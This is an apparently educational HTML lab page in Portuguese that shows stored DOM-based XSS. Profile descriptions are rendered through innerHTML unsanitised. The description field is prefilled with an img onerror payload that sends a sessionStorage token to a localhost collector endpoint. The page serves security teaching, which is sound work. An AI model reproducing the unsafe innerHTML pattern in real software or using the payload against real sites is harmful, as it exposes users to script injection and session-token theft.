<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <title>Exercício 2 - vulnerável</title>
    <script>
      // Simula armazenamento de token no sessionStorage
      sessionStorage.setItem("exer04", "exer04cliente");

      async function carregarPerfil() {
        const res = await fetch("/exercicio2");
        const perfis = await res.json();

        const container = document.getElementById("containerPerfis");
        container.innerHTML = "";

        for (const perfil of perfis) {
          const div = document.createElement("div");

          // Insere nome (não vulnerável)
          const nome = document.createElement("p");
          nome.innerHTML = `<strong>Nome:</strong> ${perfil.name}`;

          // Insere descrição vulnerável (DOM-based XSS via innerHTML)
          const descricao = document.createElement("p");
          descricao.innerHTML = `<strong>Descrição:</strong> ${perfil.description}`;

          div.appendChild(nome);
          div.appendChild(descricao);
          div.appendChild(document.createElement("hr"));
          container.appendChild(div);
        }
      }

      async function salvarPerfil() {
        const name = document.getElementById("inputNome").value;
        const description = document.getElementById("inputDescricao").value;

        await fetch("/exercicio2", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ name, description })
        });
        carregarPerfil();
      }

      window.onload = carregarPerfil;
    </script>
  </head>
  <body>
    <h3>Atualizar Perfil</h3>
    <label>Nome: <input type="text" id="inputNome" value="Atacante" /></label><br />
    <label>Descrição: <textarea id="inputDescricao">
&lt;img src=x onerror="fetch('http://localhost:3001/exercicio1-server?c='+sessionStorage.getItem('exer04'))"&gt;
    </textarea></label><br />
    <button onclick="salvarPerfil()">Salvar</button>

    <h3>Visualização dos Perfis</h3>
    <div id="containerPerfis"></div>
  </body>
</html>
